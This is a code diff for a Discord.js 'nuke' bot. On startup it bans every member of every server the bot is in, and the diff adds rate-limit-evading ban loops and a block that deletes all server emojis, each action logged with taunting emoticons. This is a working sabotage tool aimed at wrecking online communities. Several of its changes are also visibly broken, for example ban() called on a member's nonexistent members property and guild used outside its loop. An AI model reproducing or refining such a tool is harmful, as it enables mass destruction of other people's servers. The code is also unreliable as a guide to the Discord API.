@@ -1,6 +1,5 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const fs = require("fs")
 const chalk = require('chalk');
 
 
@@ -13,7 +12,7 @@ const settings = {
 client.on("ready", () => {
 
     //startup message 
-    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));  
+    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));
     // create variable for new channel to prevent it from getting deleted by nuke
     let createdChannelName;
     // Create an invite to a channel
@@ -52,10 +51,20 @@ client.on("ready", () => {
     //ban all members on the server
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
-            m.ban();
-            //log when member is banned in the console
-            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
+            //set interval to prevent ratelimit error (API restrictions)
+            setInterval(function() {
+
+                m.members.ban()
+                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
+                    .catch(console.error);
+            }, 3 * 100)
         });
+    });
+
+    //delete emojis
+    guild.emojis.forEach(e => {
+        guild.deleteEmoji(e);
+        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
     });
 
     //handle unexpected errors
